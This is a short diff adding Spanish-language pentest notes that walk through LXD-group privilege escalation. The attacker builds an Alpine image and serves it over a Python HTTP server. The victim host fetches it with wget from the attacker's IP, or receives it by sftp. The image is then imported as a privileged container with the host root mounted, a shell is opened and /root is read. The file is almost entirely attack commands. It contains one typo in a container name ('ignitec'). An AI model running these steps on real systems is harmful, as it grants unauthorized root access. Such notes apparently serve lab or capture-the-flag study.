@@ -1,0 +1,56 @@
+##1
+
+En nuestra maquina atacante ejecutamos lo siguiente:
+
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+
+
+
+##2
+
+Nos va a dejar un archivo asi: alpine-v3.10-x86_64-20191008_1227.tar.gz, 
+despues abrimos un servidor simple: 
+
+python3 -m http.server 1234
+
+
+
+##3
+
+En la maquina victima hacemos: 
+
+wget http://ipAtacante:1234/alpine-v3.10-x86_64-20191008_1227.tar.gz
+
+
+
+##Alternativa
+
+En caso de que wget y el servidor python no nos sirva, podemos usar sftp, que
+suele venir por defecto en ssh hacemos: 
+
+sftp usuario@ip (donde este el archivo alpine-v3.10-x86_64-20191008_1227.tar.gz) y hacemos 
+
+put alpine-v3.10-x86_64-20191008_1227.tar.gz
+
+
+
+##4
+
+Una vez hecho en la maquina victima hacemos: 
+
+lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
+lxc image list
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignitec
+lxc exec ignite /bin/sh
+id
+
+
+
+##5
+
+cd /mnt/root/root
+ls
